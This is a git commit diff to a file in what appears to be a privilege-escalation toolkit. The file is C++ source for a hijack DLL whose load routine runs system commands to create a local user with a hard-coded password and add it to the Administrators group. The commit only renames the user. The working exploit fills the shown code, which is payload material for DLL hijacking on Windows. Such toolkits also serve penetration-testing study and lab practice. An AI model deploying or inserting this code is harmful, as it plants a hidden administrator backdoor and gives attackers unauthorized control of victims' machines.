8aee1cc01f3105aec692ba13b68a77deff79180c
Sr4nd3rs0n <73143623+Sr4nd3rs0n@users.noreply.github.com>
2024-08-15 11:53:25 +0200

    Update adduserdll.cpp
    Change user to add

--- PrivilegeEscalation/Windows/CommPrivEscVectors/DLLHijacking/adduserdll.cpp
+++ PrivilegeEscalation/Windows/CommPrivEscVectors/DLLHijacking/adduserdll.cpp
@@ -10,8 +10,8 @@ LPVOID lpReserved ) // Reserved
     {
         case DLL_PROCESS_ATTACH: // A process is loading the DLL.
         int i;
-  	    i = system ("net user dave2 password123! /add");
-  	    i = system ("net localgroup administrators dave2 /add");
+  	    i = system ("net user sr4nd3rs0n password123! /add");
+  	    i = system ("net localgroup administrators sr4nd3rs0n /add");
         break;
         case DLL_THREAD_ATTACH: // A process is creating a new thread.
         break;
